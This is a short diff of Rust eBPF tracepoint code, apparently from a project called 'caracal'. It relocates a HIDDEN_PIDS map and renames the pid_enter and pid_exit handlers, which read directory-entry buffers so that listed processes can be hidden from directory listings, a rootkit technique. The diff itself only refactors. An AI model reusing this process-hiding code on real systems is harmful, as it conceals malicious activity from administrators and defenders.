@@ -9,12 +9,12 @@ use aya_ebpf::{
     programs::TracePointContext,
 };
 use aya_log_ebpf::{debug, error};
-use caracal_common::{MAX_BPF_OBJ, MAX_DIRENTS, MAX_HIDDEN_PIDS};
+use caracal_common::{MAX_BPF_OBJ, MAX_DIRENTS};
+
+use crate::HIDDEN_PIDS;
 
 #[map]
 static PID_DIRENTS: HashMap<u32, u64> = HashMap::<u32, u64>::with_max_entries(MAX_BPF_OBJ, 0);
-#[map]
-static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::<u32, u8>::with_max_entries(MAX_HIDDEN_PIDS, 0);
 
 #[repr(C)]
 #[derive(Debug)]
@@ -36,7 +36,7 @@ struct DirentIteratorData<'a> {
     d_reclen_prev: u16,
 }
 #[tracepoint]
-pub fn caracal_pid_enter(ctx: TracePointContext) -> Result<u32, u32> {
+pub fn pid_enter(ctx: TracePointContext) -> Result<u32, u32> {
     let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
 
     let dirents_buf_addr = unsafe { ctx.read_at::<u64>(24).map_err(|_| 1u32)? };
@@ -47,7 +47,7 @@ pub fn caracal_pid_enter(ctx: TracePointContext) -> Result<u32, u32> {
 }
 
 #[tracepoint]
-pub fn caracal_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
+pub fn pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
     let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
 
     let max_offset = unsafe { ctx.read_at::<u64>(16).map_err(|_| 1u32)? };
